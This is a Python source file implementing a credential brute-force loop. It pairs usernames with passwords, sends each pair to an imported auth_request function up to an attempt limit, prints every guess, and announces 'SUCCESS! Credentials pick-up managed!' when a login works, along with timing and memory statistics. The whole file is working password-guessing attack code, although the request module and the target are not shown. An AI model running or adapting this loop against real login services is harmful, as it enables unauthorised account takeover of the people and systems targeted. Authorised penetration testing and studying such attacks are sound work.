import time
import resource

from src.credentials_pair_generator import credentials_pair_generator
from src.neat_requests import auth_request
from src.precept import Precept


def stats_report(tic, mem_usage_start, mem_usage_iteration):
    toc = time.perf_counter()
    print(f"\nPick-up time: {toc - tic:0.4f} seconds")

    print(f'\nMemory stats: usage_start: {mem_usage_start}, last mem_usage_iteration: {mem_usage_iteration}')


def brute_force(passed_usernames, passwords, passwords_limit):
    """

    :param passed_usernames: str or iterable
    :type passwords: iterable but not str
    :param passwords_limit: int
    """
    attempt = 0
    tic = time.perf_counter()

    action = Precept.CONTINUE

    if isinstance(passwords, str):
        raise TypeError("The 'iterable_passwords' parameter must be iterable, but not string.")

    if isinstance(passed_usernames, str):
        usernames = list()
        usernames.append(passed_usernames)
    else:
        usernames = passed_usernames

    credentials_pair = credentials_pair_generator(usernames, passwords)

    mem_usage_start = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss
    while action == Precept.CONTINUE:
        try:
            creds_pair = credentials_pair.__next__()
            username = creds_pair[0]
            password = creds_pair[1]
            mem_usage_iteration = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss
            print(f'user: {username}; password: {password}')
            action = auth_request(username, password)
            attempt += 1
            if attempt == passwords_limit:
                action = Precept.STOP
        except StopIteration:
            print('\nRan out of passwords.')
            action = Precept.STOP

    if action == Precept.SUCCESS:

        print('\nSUCCESS!\nCredentials pick-up managed!')
        print('Attempt:', attempt)

        stats_report(tic, mem_usage_start, mem_usage_iteration)

        return
    elif action == Precept.STOP:
        print('\nBrute-force mismanaged. Good luck next time!')

        stats_report(tic, mem_usage_start, mem_usage_iteration)

        return
